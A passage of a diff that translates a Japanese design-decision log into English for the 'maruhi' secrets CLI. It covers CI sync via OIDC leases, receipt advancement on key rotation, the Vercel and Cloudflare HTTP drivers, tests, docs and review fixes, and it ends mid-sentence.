-リースする**(あり — AUTH_SPEC §14-1 の義務をそのまま形にする。同期元とトークン環境が別なら 2 環境)。第 2 周の新案:
-**レシートを書けないことを型で示す**(あり — `sync-ci.ts` は `sync-receipt.ts` を import せず、署名鍵を受け取らず、要求
-サービス型は `CliIo | ProcessRunner | HttpClient`。plan の芯〔computePlan / prepareWork / runDriver〕は `sync-plan.ts` と共有し、
-レシートは `receipt: null` = 全件 add)。第 3 周(壊れ方): 削除の情報源が無い → **CI は何も削除しない**と docs に明記
-(削除は手元の apply)。CI に TTY は無いが production の `--yes` は**要求する**: 目的は「本番へ書く決定が workflow ファイルに
-見える」ことで、GitHub Environments の required reviewers(補足 15 X4 = SY3)で四眼にする案内を docs に置いた。exec も http も
-CI で使える(exec は wrangler が導入済みのランナー = P3 の形)。`--anchor` は SHOULD のまま。404 の一様応答は
-`LEASE_NOT_FOUND_MESSAGE`(ci-lease.ts)をそのまま使い、文面の `--env` を「the environment in the workflow」に改めた。
-**SY3 との線引き**: 第 2 段 = コマンド + docs「In CI」節の書き換え、SY3 = workflow テンプレート 2 標準形 + 四眼の docs。
-SY3 行の「`maruhi ci run -- maruhi sync <target>` の入れ子」は成り立たない(第 1 段の裁定 G)ので `maruhi ci sync <target>` に
-直した(なし)。**選定 = (i)**。棄却: (ii)(`ci run` は `--` の後ろを実行する契約で、同期は実行ではない)、(iii)(`sync apply`
-はセッション・キーチェーン・床を前提にする経路で、CI モードを混ぜると型の分離が消える)。
+**D. `sync` in CI** — command shape: (i) `maruhi ci sync <target>` (same explicit flags as `ci run` + `--config` / `--yes`) / (ii) `ci run --sync <target>` / (iii) `sync apply --ci`. Round-1 new option: carve the lease's preceding leg (ephemeral key, OIDC issuance, token-replayed retry, §9.1 verification) into `ci-lease.ts` shared with `ci run`, and **lease multiple environments in sequence under one token and one ephemeral key** (available — makes AUTH_SPEC §14-1's obligation literally the shape. If the sync source and the token environment differ, that's 2 environments). Round-2 new option: **express "can't write receipts" in types** (available — `sync-ci.ts` doesn't import `sync-receipt.ts`, takes no signing key, and its required-services type is `CliIo | ProcessRunner | HttpClient`. Plan's core〔computePlan / prepareWork / runDriver〕is shared with `sync-plan.ts`; the receipt is `receipt: null` = everything is an add). Round 3 (failure modes): no source of delete information → **CI deletes nothing** — stated in docs (deletes happen on local apply). CI has no TTY but production's `--yes` is still **required**: the purpose is "the decision to write production is visible in the workflow file", and docs guide making it four-eyes via GitHub Environments' required reviewers (supplement 15 X4 = SY3). Both exec and http work in CI (exec = P3's shape on a runner with wrangler installed). `--anchor` stays SHOULD. The uniform 404 response reuses `LEASE_NOT_FOUND_MESSAGE` (ci-lease.ts) as-is, with the wording's `--env` changed to "the environment in the workflow". **The line vs SY3**: stage 2 = the command + rewriting docs' "In CI" section; SY3 = the workflow template's 2 standard forms + four-eyes docs. The SY3 row's "nesting `maruhi ci run -- maruhi sync <target>`" doesn't hold (stage 1 ruling G) so it was corrected to `maruhi ci sync <target>` (no). **Chosen = (i)**. Rejected: (ii) (`ci run`'s contract is to execute what follows `--`; sync isn't an execution), (iii) (`sync apply` is a path premised on session / keychain / floor — mixing CI mode erases the type separation).
 
-**E. M1 — `env rotate` によるレシートの前進** — 第 2 段 2b へ送る(裁定 A′)。本セッションで確かめたこと: (1) `envRotateOp` の
-`reencryptCurrentValues` は受理された自分の書き込みを `written: VerifiedPulledValue[]`(名前・新 version 込み)として持つ
-ので、**候補 (iv)〔変数ごとの新 version を返す〕は追加の往復なしに成立する**。(2) 検証済みビューにもワイヤにも「この version は
-再暗号化で平文は不変」という印は無い(`VerifiedPulledValue` は version / epoch / writer だけ。AUTH_SPEC §12-5 の
-`reencryption` マーカーは受理時の検査で、配布形には残らない)→ 候補 (ii)〔epoch だけ進んだを unchanged 扱い〕は**棄却**
-(値の不変を推定できない)。(3) `alreadyCurrent`(並行 push で既に現エポック)は平文が変わりうるので進めない。(4) 設定は
-cwd 依存で rotate はリポジトリの外からも打たれる → `--config` 明示時のみ進め、無ければ結びで `maruhi sync plan` を案内する形が
-出発点。(5) レシート環境自身のローテーションは、レシート変数の version が進むだけで中身は不変 = 影響なし。2b の裁定録は
-この 5 点から始める。
+**E. M1 — `env rotate` advancing receipts** — deferred to stage 2b (ruling A′). What this session confirmed: (1) `envRotateOp`'s `reencryptCurrentValues` holds its accepted own writes as `written: VerifiedPulledValue[]` (names + new versions included), so **candidate (iv)〔return the new version per variable〕works with no extra round trip**. (2) Neither the verified view nor the wire carries a mark "this version is a re-encryption; plaintext unchanged" (`VerifiedPulledValue` holds version / epoch / writer only. AUTH_SPEC §12-5's `reencryption` marker is an acceptance-time check; it doesn't survive into the distribution form) → candidate (ii)〔treat "only the epoch advanced" as unchanged〕is **rejected** (value-unchanged can't be inferred). (3) `alreadyCurrent` (already on the current epoch via a concurrent push) may have changed plaintext, so it can't be advanced. (4) The config is cwd-dependent and rotate can be run from outside the repo → the starting point is "advance only when `--config` is explicit; otherwise guide `maruhi sync plan` at the end". (5) Rotating the receipt environment itself only advances the receipt variable's version; its content is unchanged = no impact. 2b's ruling record starts from these 5 points.
 
-**F. `sync init`** — 出力先: (i) JSON を stdout(anchor の先例) / (ii) ファイルを書く(既存は拒否) / (iii) `--write` で両方。
-入力: フラグのみ(`<target> --preset --env --receipts [--driver] [--variables] [--exclude] [--production] [--cwd] [--command]
-[--token-env] [--token-name] [--option k=v]… [--project]`) / 対話 / 検証済みビューから環境一覧。第 1 周の新案: **生成物を出す前に
-`parseSyncConfig` に通す**(あり — 往復が構造で保証され、通らなければ理由を添えて書き方の誤り = 2。ネットワークにも
-ファイルにも触れない)。第 2 周(壊れ方): 2 つ目のターゲットの「追記」は既存 JSON の再直列化を伴い、キー順・整形を CLI が
-勝手に変える → 持たない(docs の表で手で足す)。`variables` 省略 = "all" は W3 に反しうる → Note で `exclude` / 明示リストを
-案内。`--production` は true だけ(false は JSON を編集)。対話は TTY 判定と再現性の問題を持ち込むので採らない(なし)。
-**選定 = (i) + フラグのみ + 往復検査**。`--option` は `Flag.atMost(64)` の繰り返し(boolean の宣言は "true" / "false" を写す)。
+**F. `sync init`** — output destination: (i) JSON to stdout (the anchor precedent) / (ii) write a file (refuse if existing) / (iii) both via `--write`. Input: flags only (`<target> --preset --env --receipts [--driver] [--variables] [--exclude] [--production] [--cwd] [--command] [--token-env] [--token-name] [--option k=v]… [--project]`) / interactive / environment list from the verified view. Round-1 new option: **pass the product through `parseSyncConfig` before emitting it** (available — the round trip is guaranteed by structure; if it doesn't pass, it's a usage error with reasons = 2. Touches neither the network nor files). Round 2 (failure modes): "appending" a second target requires re-serializing the existing JSON — the CLI would change key order / formatting on its own → not held (docs' table has you add by hand). `variables` omitted = "all" can violate W3 → a Note guides to `exclude` / explicit lists. `--production` is true-only (false = edit the JSON). No interactive mode (it would import TTY detection and reproducibility problems) (no). **Chosen = (i) + flags only + round-trip check**. `--option` is `Flag.atMost(64)` repeated (a boolean declaration maps "true" / "false").
 
-**G. Vercel / Cloudflare の API 固有** — Cloudflare: account ID は `options.accountId`(必須。`GET /accounts` で引く案は通信と
-権限〔Account Settings: Read〕が増える)。スクリプト名は `derive` で `getLegacyScriptName` の規則を写す。未デプロイ(10007 /
-10090)は **draft Worker を作らず**型付きエラーで `wrangler deploy` を案内(空の Worker を http ドライバが黙って作る形は
-「同期が Worker を作った」を残す)。件数 100 / リクエスト(docs 裏取り済み)。Vercel: 配列 + `upsert=true` で一括、**件数は
-25 / リクエスト**(docs に上限が無いので保守側。総量 64 KB の上限には件数が効かない)、`type` は CLI の `resolveFinalType` を
-写す(development / `sensitive: false` = encrypted、他は sensitive)、`target: [environment]`、`gitBranch`、`teamId` はクエリ。
-削除は一覧(`target` / `gitBranch` で絞る)→ 同名の項目の id を `DELETE`。**一覧に無ければ「既に消えている」として削除済み
-扱い**(exec の `vercel env rm` が不在名で失敗し続ける wart〔第 1 段 改訂 2 / 3〕が http では構造的に消える。一覧は id の
-突合にだけ使い、値は読まない = 一方通行のまま)。DELETE の 404(一覧の直後に並行して消えた)も同じ。`created` の値の echo は
-表示しない。制約: http の Vercel は空値・末尾改行・16 KiB の制約を持たない(CLI の stdin 由来だった)。空文字列を API が
-受けるかは未確認(受けなければ API の失敗として文面に出る)。
+**G. Vercel / Cloudflare API specifics** — Cloudflare: account ID is `options.accountId` (required. The `GET /accounts` lookup option adds a call and a permission〔Account Settings: Read〕). The script name's `derive` transcribes `getLegacyScriptName`'s rule. Undeployed (10007 / 10090) → **no draft Worker is created**; a typed error guides to `wrangler deploy` (the http driver silently creating an empty Worker would leave "sync created a Worker"). 100 items per request (docs-verified). Vercel: array + `upsert=true` bulk, **25 items per request** (no cap in the docs, so conservative. The 64 KB total cap is independent of item count); `type` transcribes the CLI's `resolveFinalType` (development / `sensitive: false` = encrypted, otherwise sensitive); `target: [environment]`, `gitBranch`, `teamId` as query. Delete = list (filtered by `target` / `gitBranch`) → find the same-named item's id → `DELETE`. **Absent from the list = treated as already deleted** (the wart where exec's `vercel env rm` keeps failing on a missing name〔stage 1 revisions 2 / 3〕structurally disappears under http. The list is used only for id matching; values are never read = stays one-way). A DELETE 404 (deleted concurrently right after listing) is the same. `created`'s value echo is never displayed. Constraints: http's Vercel has no empty / trailing-newline / 16 KiB constraints (those came from the CLI's stdin). Whether the API accepts an empty string is unconfirmed (if not, it surfaces as an API failure in the message).
 
-**I. テスト** — `test/support/vendor-api.ts`(状態つきの `node:http` — Workers = merge-patch を保存へ適用、Vercel = upsert /
-一覧 / DELETE を状態で、`created` は実物どおり値を echo、`rejectKeys` で部分成功、`override` で 429 / 5xx を差し込む)。
-宛先の差し替えは**製品コードに口を持たず**、`TestEnv.setVendorOrigin(host, origin)` が `HttpClient.mapRequest` で固定ホストを
-偽サーバーへ写す。固定した性質: 値とトークンが URL・クエリ・ヘッダー(Authorization 以外)・stdout・stderr に出ない、本文の形
-(Workers = secrets / Vercel = 配列 + upsert)、スクリプト名の合成、`type` の導出、teamId、削除(null / 一覧 → DELETE、
-production の同名は残す)、429 → 再送、503 × 3 → exit 1 と echo の伏せ字化、10007 の案内、トークン不在 / 改行、同一環境の
-トークンを運ばない、Vercel の部分成功をレシートに割る、403、第 1 段の設定(driver 無し)の後方互換。`ci sync` は `ci-run.test.ts`
-の先例(OIDC 発行 + 実 crypto のリースラップ)で: 2 環境を同じ一時鍵・OIDC 発行 1 回、レシート書き込みゼロ、削除ゼロ、exec
-の stdin、production の `--yes`、フラグ欠落 / project 食い違い = 2、トークン環境の 404 一様応答。`sync init` は往復(JSON →
-`parseSyncConfig`)と usage エラー 6 態。`redacted.test.ts` の棚卸し表: `ci-run.ts` → `ci-lease.ts`、`sync-exec.ts` 3、`sync-http.ts`
-1、`sync-plan.ts` 3。`--help` golden(ci / ci sync / sync / sync init / sync apply の文言)。fallow の複雑度(CRAP > 30)は
-応答の読みとモックのハンドラを関数に割って収めた。
+**I. Tests** — `test/support/vendor-api.ts` (a stateful `node:http` — Workers applies the merge-patch to stored state, Vercel does upsert / list / DELETE against state, `created` echoes values like the real thing, `rejectKeys` produces partial success, `override` injects 429 / 5xx). Destination substitution has **no hook in product code**; `TestEnv.setVendorOrigin(host, origin)` rewrites the fixed host to the fake server via `HttpClient.mapRequest`. Pinned properties: values and tokens never appear in URL, query, headers (other than Authorization), stdout, stderr; body shape (Workers = secrets / Vercel = array + upsert); script-name composition; `type` derivation; teamId; deletes (null / list → DELETE; a same-named production entry is kept); 429 → re-send; 503 × 3 → exit 1 + echo redaction; the 10007 guidance; missing / newline-bearing token; never carry a same-environment token; partial Vercel success split into the receipt; 403; backward compatibility with a stage-1 config (no driver). `ci sync` follows `ci-run.test.ts`'s precedent (OIDC issuance + real-crypto lease wrap): 2 environments under the same ephemeral key with 1 OIDC issuance, zero receipt writes, zero deletes, exec's stdin, production's `--yes`, missing flags / project mismatch = 2, the token environment's uniform 404. `sync init` is round-tripped (JSON → `parseSyncConfig`) + 6 usage-error cases. `redacted.test.ts`'s inventory table: `ci-run.ts` → `ci-lease.ts`, `sync-exec.ts` 3, `sync-http.ts` 1, `sync-plan.ts` 3. `--help` golden (wording of ci / ci sync / sync / sync init / sync apply). fallow complexity (CRAP > 30) was contained by splitting response-reading and mock handlers into functions.
 
-**J. docs** — `deploy-targets.mdx`: 冒頭(2 ドライバ)、「How maruhi sync works」(http の値の経路と応答の扱い)、Set up
-(`maruhi sync init` の例。```sh の禁止パターン検査〔`>` のリダイレクト不可〕があるので stdout をどう保存するかは散文で)、
-config の表(`driver` / `token`、ドライバ別の options、version の互換線)、新節「Without the vendor CLI: the http driver」
-(トークンの作り方と最小権限、専用環境、設定例、Workers / Vercel の違い、リトライ、proxy、失敗表示)、「Receipts」に CI の
-1 点、「In CI」を予告から `maruhi ci sync` の実物へ(リースポリシーの 2 環境・両ドライバ・レシート無し = 削除しない・
-`--yes` と required reviewers・値はログに出ない。workflow テンプレートは SY3 と明記)、「Vendor CLI telemetry」に通信先の
-1 文。`recipes.test.ts` は `maruhi run --env production -- ` で始まるブロックだけを実行し、禁止パターンは全 ```sh に掛かる —
-新しいブロック(`sync init` / `ci sync`)は禁止パターンに触れない。index の Card と README の 1 行を追随。
+**J. docs** — `deploy-targets.mdx`: the top (2 drivers), "How maruhi sync works" (http's value path and response handling), Set up (a `maruhi sync init` example. Since the ```sh forbidden-pattern check〔no `>` redirects〕exists, how to save stdout is written in prose), the config table (`driver` / `token`, per-driver options, the version compatibility line), a new section "Without the vendor CLI: the http driver" (how to make a token and least privilege, the dedicated environment, a config example, Workers / Vercel differences, retries, proxy, failure display), one CI point under "Receipts", "In CI" changed from a notice to the real `maruhi ci sync` (the 2 environments of a lease policy, both drivers, no receipts = no deletes, `--yes` and required reviewers, values not in logs. The workflow template is explicitly SY3), one endpoint line in "Vendor CLI telemetry". `recipes.test.ts` runs only blocks starting with `maruhi run --env production -- `, while forbidden patterns apply to every ```sh — the new blocks (`sync init` / `ci sync`) touch no forbidden pattern. index's Card and README's one line follow.
 
-**検証(2026-09-07)**: `FALLOW_AUDIT_BASE=origin/main bun run check` 7 段(CLI 957 件)。`--help` golden の更新(ci / ci sync /
-sync / sync init / sync apply)と `message-style.test.ts`。`apps/site` の `validate --strict` / `build` / `e2e`。実測: wrangler
-4.128.0 の `putBulkSecrets` / `getLegacyScriptName` / `isWorkerNotFoundError`(10007 / 10090)、Vercel CLI 59.11.7 の
-`addEnvRecord` / `removeEnvRecord` / `getEnvRecords` / `resolveFinalType` / `client.fetch` のリトライ、公開 REST docs(配列と
-`{created, failed}`)、Bun 1.4.0 の `HTTPS_PROXY`。**確認できなかったこと**: 実アカウントでの通し(Cloudflare / Vercel の API
-トークン — 人間タスクに足す)、Vercel の 1 リクエストの件数上限と空文字列の受理、Cloudflare API docs のトークン権限名
-(公開ページは 404 / 権限の記載なし — wrangler と dashboard の表記「Workers Scripts: Edit」に依る)、Cloudflare の
-secrets-bulk が部分失敗を返しうるか(envelope は `success` 1 つなので全か無かとして扱った)。
+**Verification (2026-09-07)**: `FALLOW_AUDIT_BASE=origin/main bun run check`'s 7 stages (CLI 957 tests). `--help` golden updated (ci / ci sync / sync / sync init / sync apply) and `message-style.test.ts`. `apps/site`'s `validate --strict` / `build` / `e2e`. Measured: wrangler 4.128.0's `putBulkSecrets` / `getLegacyScriptName` / `isWorkerNotFoundError` (10007 / 10090), Vercel CLI 59.11.7's `addEnvRecord` / `removeEnvRecord` / `getEnvRecords` / `resolveFinalType` / `client.fetch` retry, the public REST docs (the array and `{created, failed}`), Bun 1.4.0's `HTTPS_PROXY`. **Not confirmed**: an end-to-end run on real accounts (Cloudflare / Vercel API tokens — added to human tasks), Vercel's per-request item cap and empty-string acceptance, the Cloudflare API docs' token permission name (the public page is 404 / no permission listing — relying on wrangler's and the dashboard's "Workers Scripts: Edit"), whether Cloudflare's secrets-bulk can return partial failure (the envelope has a single `success`, so it's treated as all-or-nothing).
 
-**改訂 1(2026-09-07、Cursor Bugbot〔abaaf30〕)**: (1) `maruhi ci sync` が `ci run` の必須フラグの文面を流用し、
-「`--env` を渡せ」「config ファイルを読まない」と言っていた(`ci sync` に `--env` は無く、同期設定は読む)→ `requireCiFlag` に
-コマンドを渡し、`ci sync` は「同期設定以外は読まない・環境はターゲットが決める」と言う(テストで固定)。(2) 統合トークンが
-**レシート環境**にあるとき、`openSyncTarget` が同じ環境に 2 つ目の床ハンドルを開いていた(トークンの pull で前進した床を
-レシートの push が知らない)→ 同期元 / レシート環境と同じならその床ハンドルを使う。トークンをレシート環境に置いて apply →
-plan が通る態を足した。
+**Revision 1 (2026-09-07, Cursor Bugbot〔abaaf30〕)**: (1) `maruhi ci sync` had reused `ci run`'s required-flags wording, saying "pass `--env`" and "doesn't read a config file" (`ci sync` has no `--env` and does read the sync config) → `requireCiFlag` now takes the command, and `ci sync` says "reads nothing but the sync config; the environment is decided by the target" (pinned by test). (2) When the integration token lives in the **receipt environment**, `openSyncTarget` was opening a second floor handle on the same environment (the receipt push didn't know about the floor advanced by the token pull) → if it equals the sync-source / receipt environment, reuse that floor handle. A case was added: token in the receipt environment, apply → plan passes.
 
-**改訂 2(2026-09-07、pullfrog の初回レビュー〔abaaf30〕)**: (1) Vercel の削除は一覧の**完全性**を仮定していた —
-公開 schema の 200 応答には `{envs, pagination: {count, next, prev}}` の変種があり、続きのページに名前があっても「消えている」
-と読んでレシートから落とす(秘密が同期先に残り続ける、悪い方向の誤り)。候補: (i) `pagination.next` を辿る(パラメータ名を
-docs で確かめられない)/ (ii) **続きがあるのに名前が無ければ fail-closed**(レシートに残し、文面で同期先での手動削除か再 apply を
-案内)。(ii) を採り、宣言に `nextPage: ["pagination", "next"]` を足した。完全な一覧に無い = 削除済み扱いは維持(冪等な削除)。
-(2) `readVercel` は `failed` の**不在**から全件成功を読んでいた(`{}` の 2xx でもレシートに書く)→ 書き込みの 2xx に `created` が
-無ければ「期待した形でない応答」として届いたと読まない(Cloudflare の `success === true` と対称に)。(3) `ci-lease.ts` の
-token-replayed の文面が 2 か所にあった → 定数に。(4) `checkIntegrationToken` は ISO-8859-1 の外の文字も拒む(`Headers` が
-TypeError で落とす経路を型付きエラーに)。(5) docs の `NO_PROXY` は Bun 1.4.0 で実測した(到達不能な proxy + NO_PROXY で到達)
-ので据え置き。
+**Revision 2 (2026-09-07, pullfrog's first review〔abaaf30〕)**: (1) Vercel's delete assumed the listing's **completeness** — a variant of the public schema's 200 response is `{envs, pagination: {count, next, prev}}`, and even if the name is on a next page it would read "already gone" and drop it from the receipt (a secret staying at the destination forever — an error in the bad direction). Candidates: (i) follow `pagination.next` (the parameter name couldn't be confirmed in the docs) / (ii) **if the listing has more pages but the name is absent, fail-closed** (keep it in the receipt; the message guides manual deletion at the destination or a re-apply). (ii) adopted; the declaration gained `nextPage: ["pagination", "next"]`. "Absent from a complete listing = treated as deleted" is kept (idempotent deletes). (2) `readVercel` was reading total success from `failed`'s **absence** (even a `{}` 2xx got written to the receipt) → now a write's 2xx without `created` isn't read as delivered (symmetric with Cloudflare's `success === true`), reported as "a response in an unexpected shape". (3) `ci-lease.ts`'s token-replayed wording existed in 2 places → a constant. (4) `checkIntegrationToken` now also rejects characters outside ISO-8859-1 (turns the path where `Headers` throws a TypeError into a typed error). (5) docs' `NO_PROXY` stays since it was measured on Bun 1.4.0 (unreachable proxy + NO_PROXY reaches).
 
-**第 2 段 2b 以降への申し送り**: (1) **M1**(→ 2b で実装 — 下の「#### 第 2 段 2b」。裁定 E の 5 点から。`envRotateOp` の `written` を返り値に載せ、`env rotate
---config` があれば回した環境を同期元とするターゲットのレシートを再暗号化を完了した変数だけ新 version へ書く。`alreadyCurrent` /
-`remaining > 0` / resumed / レシート環境自身 / 二重書きの無害性 / 900 警告を早める点をテストで固定。docs「Receipts」1 点目を
-実挙動へ)、(2) 全ターゲット一括の plan(`--all`)、(3) 第 3 段(autoSync / push 時同期 / `gh workflow run`)、(4) SY3 = workflow
-テンプレート 2 標準形 + 四眼の docs(`maruhi ci sync` の上に載る)、(5) SY4 Netlify(http プリセットの宣言 1 つ + モック)、
-(6) SY5 gh プリセット(exec の宣言だけで載る形は確認済み)、(7) Vercel の 16 KiB(exec)は macOS の実測後に見直す、
-(8) http の Vercel で空文字列が拒否されるなら `constraints.nonEmpty` を宣言に足す(人間タスクの結果待ち)。
+**Handoff to stage 2b onward**: (1) **M1** (→ implemented in 2b — "#### Stage 2b" below. Starting from ruling E's 5 points. `envRotateOp`'s `written` goes on the return value; when `env rotate --config` is present, the receipts of targets whose sync source is the rotated environment are rewritten to the new versions for only the variables whose re-encryption completed. Tests pin `alreadyCurrent` / `remaining > 0` / resumed / the receipt environment itself / the harmlessness of double-writing / moving the 900 warning earlier. The first "Receipts" point in docs matches actual behavior), (2) all-target plan (`--all`), (3) stage 3 (autoSync / push-time sync / `gh workflow run`), (4) SY3 = workflow template's 2 standard forms + four-eyes docs (rides on `maruhi ci sync`), (5) SY4 Netlify (one http-preset declaration + a mock), (6) SY5 gh preset (confirmed it rides on exec declaration only), (7) Vercel's 16 KiB (exec) is revisited after macOS measurement, (8) if http's Vercel rejects empty strings, add `constraints.nonEmpty` to the declaration (awaiting the human-task result).
 
-#### 第 2 段 2b(2026-09-07)
+#### Stage 2b (2026-09-07)
 
-第 2 段の裁定 A′ で PR 単位に切り出した **2b = M1(`env rotate` によるレシートの前進)** を実装した(PR #156)。設計は §3 冒頭
-「同期の最終形」の表と補足 14 M1 が正で、蒸し返していない。出発点は第 2 段の裁定 E の 5 点: (1) `reencryptCurrentValues` の
-`written`(名前・新 version 込み)から追加の往復なしに新 version が取れる、(2) 値の不変を示す印はどこにも無い(候補 (ii)
-「epoch だけ進んだを unchanged 扱い」は棄却済み)、(3) `alreadyCurrent` は平文が変わりうるので進めない、(4) 設定は cwd 依存で
-rotate はリポジトリの外からも打たれる → `--config` 明示時のみ、(5) レシート環境自身のローテーションはレシート変数の version が
-進むだけで中身は不変。各裁定点は同じループで決め、「新案なし」の周では壊れ方(境界値・中断・並行操作・二重書き)を問うた。
+Implemented **2b = M1 (`env rotate` advancing receipts)**, carved out by stage 2's ruling A′ as a PR unit (PR #156). The sources of truth are §3's head "final form of sync" table and supplement 14 M1; not re-litigated. The starting point is stage 2 ruling E's 5 points: (1) `reencryptCurrentValues`'s
+`written` (names + new versions) yields the new versions with no extra round trip, (2) no mark anywhere proves a value is unchanged (candidate (ii) "treat epoch-only-advanced as unchanged" already rejected), (3) `alreadyCurrent` may have changed plaintext so it can't be advanced, (4) the config is cwd-dependent and rotate can be run from outside the repo → only when `--config` is explicit, (5) rotating the receipt environment itself only advances the receipt variable's version; content unchanged. Each ruling point was decided by the same loop, and on "no new option" rounds we asked about failure modes (boundary values, interruption, concurrent operations, double writes).
 
-**前提の確認(実装を読んで確かめた事実。日付はすべて 2026-09-07)**:
-(1) `runPushPass` の `written: VerifiedPulledValue[]` は**受理された自分の書き込み**(署名対象そのものから組む — サーバー echo
-でない)で、名前は検証済みステートメント由来。巡を跨いだ集約は `recordKnown` の台帳(整合検査用)にしか無く、summary には
-**件数だけ**が載っていた。(2) 押し戻し(自分の書き込みの巻き戻し)は巡末の再走査 `reconcileKnown` → `winnerInconsistency` が
-**証拠として即時中断**させる(`abort` → エラー channel)ので、summary が返る経路には現れない。再走査に到達できなかった実行
-(`remainingExact = false`)でも、受理済みの書き込み自体は取り消せない。(3) 設定の検証は**レシート環境を同期元にできない**
-(第 1 段の裁定 C)ので、「回した環境 = レシート環境」のとき、その環境を同期元にするターゲットは存在しない = 進めるものが無い。
-(4) `loadReceipt` は前進した `verified` を返し(第 1 段の改訂 1)、`storeReceipt` は `pushVariable`(§4.1 の署名 = master
-sig 鍵。409 は内部で有界再試行)。値は `Redacted.make` で包んで渡すので剥がす場所は増えない。(5) `sync plan` の状態表(値・
-version のみ)と `Nothing to apply` は sync-plan.ts の既存経路で、レシートが正しく進めば何も変えずに unchanged になる。
+**Premise verification (facts confirmed by reading the implementation. All dates 2026-09-07)**:
+(1) `runPushPass`'s `written: VerifiedPulledValue[]` is **its own accepted writes** (built from the signed object itself — not a server echo), with names from the verified statements. Cross-round aggregation existed only in `recordKnown`'s ledger (for consistency checks); the summary carried **counts only**. (2) A rollback (reverting its own writes) is **aborted immediately as evidence** by the round-end re-scan `reconcileKnown` → `winnerInconsistency` (`abort` → the error channel), so it never appears on a path that returns a summary. Even on runs that never reach the re-scan (`remainingExact = false`), the accepted writes themselves can't be un-written. (3) Config validation forbids **the receipt environment being a sync source** (stage 1 ruling C), so when "the rotated environment = the receipt environment", no target is synced from it = nothing to advance. (4) `loadReceipt` returns the advanced `verified` (stage 1 revision 1); `storeReceipt` is `pushVariable` (§4.1 signature = master sig key; 409 retried internally with bounds). The value is passed wrapped in `Redacted.make`, so no new unwrap site. (5) `sync plan`'s state table (values + versions only) and `Nothing to apply` are sync-plan.ts's existing paths; once the receipt advances correctly they become unchanged with nothing modified.
 
-**経路 × 変数の状態 × レシートの状態(裁定 A〜D の入力)**:
+**Path × variable state × receipt state (the input to rulings A–D)**:
 
-| 経路 | 変数の状態 | レシート: 無し | 直前 version を指す | 遅れている / 別系統 | 名前が無い |
+| Path | Variable state | Receipt: none | Points at the previous version | Behind / a different lineage | No such name |
 |---|---|---|---|---|---|
-| rotated / resumed | 完了(`written`) | 何もしない(静か) | **進める**(v−1 → v) | 据え置き(件数と名前を 1 行) | 据え置き(未同期。言わない) |
-| rotated / resumed | `alreadyCurrent`(並行 push) | — | 据え置き(`written` に無い。平文が変わりうる) | 据え置き | 据え置き |
-| rotated / resumed | `remaining`(未完了・押し戻し) | — | 据え置き(未完了)。押し戻しは中断 = summary 無し | 据え置き | 据え置き |
-| resumed | 前回の実行が進めた変数 | — | この実行の `written` に無い = 据え置き(不変の証拠が無い) | 同左 | 同左 |
-| up-to-date | (何も書かない) | 何もしない | 何もしない(`written` 空) | 何もしない | 何もしない |
-| sweep(revoke / remove / 降格) | — | 対象外(裁定 C — 設定を渡す口が無い) | 対象外 | 対象外 | 対象外 |
+| rotated / resumed | complete (`written`) | do nothing (quiet) | **advance** (v−1 → v) | leave as-is (counts and names in 1 line) | leave as-is (unsynced. Not mentioned) |
+| rotated / resumed | `alreadyCurrent` (concurrent push) | — | leave as-is (absent from `written`. Plaintext may have changed) | leave as-is | leave as-is |
+| rotated / resumed | `remaining` (incomplete / rolled back) | — | leave as-is (incomplete). A rollback aborts = no summary | leave as-is | leave as-is |
+| resumed | a variable advanced by the previous run | — | absent from this run's `written` = leave as-is (no proof of unchanged) | same | same |
+| up-to-date | (nothing written) | do nothing | do nothing (`written` empty) | do nothing | do nothing |
+| sweep (revoke / remove / demote) | — | out of scope (ruling C — no way to pass the config) | out of scope | out of scope | out of scope |
 
-**A. `written` の載せ方** — 列挙: (i) `RotationSummary.written: readonly {name, version}[]`(巡と再開を跨いで集約)/ (ii)
-`VerifiedPulledValue[]` をそのまま載せる / (iii) `envRotateOp` の返り値は変えず、コールバックで受ける。第 1 周の新案: (iv)
-**レシートの前進を `envRotateOp` の内側に入れる**(`RotateInput` に設定由来のターゲットを渡す)(あり — 往復は同じだが、
-env-rotate.ts が sync-* を知る形になり、A′ の「env-rotate.ts への変更を最小に独立レビュー」の理由に反する。後始末は外に置く)。
-第 2 周(壊れ方): (ii) は暗号文・署名まで summary に運び、表示層が要らないものを持つ。(iii) は `sweepRotateFor` の 3 呼び出し元に
-no-op を配る。(i) で「最終再走査で完了が確認された名前だけ」に絞る案は、前提 (2) のとおり押し戻しが中断になるため絞る対象が無く、
-`remainingExact = false` の実行で受理済みの書き込みを捨てる理由も無い(進めても、万一巻き戻されていれば plan が changed と
-示すだけ = 無害な側)(なし)。**選定 = (i)**。`ReencryptOutcome` と summary の 4 経路(rotated / resumed / up-to-date /
-再開で押せる対象なし)すべてに載せ、`reencryptCurrentValues` が巡ごとの `attempted.written` を名前と version に写して集める。
-棄却: (ii)(不要な材料)、(iii)(呼び出し元の分岐)、(iv)(A′ に反する)。
+**A. How `written` is carried** — enumeration: (i) `RotationSummary.written: readonly {name, version}[]` (aggregated across rounds and resumes) / (ii) carry `VerifiedPulledValue[]` as-is / (iii) don't change `envRotateOp`'s return; receive via a callback. Round-1 new option: (iv) **put the receipt advance inside `envRotateOp`** (pass the config-derived targets via `RotateInput`) (available — same round trips, but it makes env-rotate.ts know sync-*, violating A′'s reason "keep env-rotate.ts changes minimal for independent review". Cleanup stays outside). Round 2 (failure modes): (ii) carries ciphertext and signatures into the summary — the display layer gets material it doesn't need. (iii) distributes a no-op to `sweepRotateFor`'s 3 callers. The (i)-variant "narrow to only names confirmed complete at the final re-scan" has nothing to narrow since rollbacks abort per premise (2), and there's no reason to discard accepted writes on a `remainingExact = false` run (advancing them is on the harmless side — worst case, plan shows them changed) (no). **Chosen = (i)**. Carried on all 4 of `ReencryptOutcome`'s summary paths (rotated / resumed / up-to-date / nothing to push on resume); `reencryptCurrentValues` transcribes each round's `attempted.written` into names and versions. Rejected: (ii) (unneeded material), (iii) (branching at callers), (iv) (against A′).
 
-**B. 設定の与え方と発火条件** — 列挙: (i) `env rotate --config <path>` 明示時のみ / (ii) cwd に `maruhi.sync.json` があれば
-自動 / (iii) 専用コマンド `maruhi sync ack <target>`(rotate は結びで案内するだけ)。第 1 周の新案: (iv) `--config` 無しのとき
-結びで `maruhi sync plan` を案内する note(なし — 同期を使わない利用者の毎回のローテーションに無関係な note が出る。既存の
-アンカー更新 note とも重なる。docs が言う)。第 2 周(壊れ方): (ii) は別プロジェクトのリポジトリで打つと `project` を省いた設定を
-黙って使い、存在しない環境のレシートを読みに行く(`--config` 明示なら利用者の断言)。(iii) は **M1 の核に反する**: 後から打つ
